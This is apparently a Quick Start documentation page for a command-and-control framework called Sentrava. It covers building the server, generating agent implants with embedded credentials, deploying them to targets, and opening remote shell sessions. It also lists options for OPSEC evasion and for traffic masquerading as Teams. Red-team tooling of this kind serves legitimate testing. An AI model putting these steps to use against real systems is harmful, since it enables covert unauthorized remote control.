---
title: Quick Start
slug: quick-start
category: Getting started
---

# Quick Start

Get a working session in five minutes. This walkthrough uses the mTLS transport on a local test network.

<div class="callout callout-warning"><strong>Use an isolated environment.</strong><p>Run this on a dedicated lab network. Do not point test infrastructure at a working installation or production targets.</p></div>

## Step 1 — Build

```sh
make release-server
go build -o ./bin/sentrava-client ./cmd/client
go build -o ./bin/sentrava-agent ./cmd/agent
```

## Step 2 — Start the server

Open a terminal and run:

```sh
./bin/sentrava-server
```

On first run the server generates its PKI and database, then begins listening on `127.0.0.1:50051` (gRPC), `127.0.0.1:8080` (dashboard), and `127.0.0.1:4433` (agent mTLS).

## Step 3 — Connect with the operator CLI

Open a second terminal:

```sh
./bin/sentrava-client
```

The CLI connects to the server over gRPC mTLS using the operator certificate generated at server first-run.

## Step 4 — Create an operation and generate an agent

Inside the CLI REPL:

```
sentrava > operations create lab --target <target-ip>
sentrava > generate --listener TEAMSERVER_IP:4433
```

`generate` compiles a configured agent binary with embedded credentials (cert, key, CA, server address, AgentID, OperationID) and writes it to a package directory. The path is printed to the console.

## Step 5 — Deploy the agent

Copy the agent binary to the target and run it:

```sh
scp <package-path>/sentrava-agent user@<target>:~/
```

On the target:

```sh
./sentrava-agent
```

## Step 6 — Get a session

Back in the operator CLI:

```
sentrava > sessions list
sentrava > sessions use <session-id>
sentrava > whoami
sentrava > ps
sentrava > shell id
```

## Common generate options

```sh
# Session mode (persistent connection, interactive shell available)
generate --agent-mode session --listener <ip>:4433

# With OPSEC modules
generate --opsec basic --listener <ip>:4433

# Windows target
generate --os windows --arch amd64 --listener <ip>:4433

# HTTP transport with C2 profile masquerading
generate --transport http --profile teams-http --listener <ip>:8888
```

See [Generate options](generate-options.html) for the full flag reference.

## Troubleshooting

**Agent connects but no session appears**

```
sentrava > agents list --status all
```

If status is `pending`, activate the agent:

```
sentrava > agents activate <agent-id>
```

**mTLS handshake failed**

Verify the server and agent were built against the same PKI. Regenerate the agent:

```
sentrava > generate --listener <ip>:<port>
```
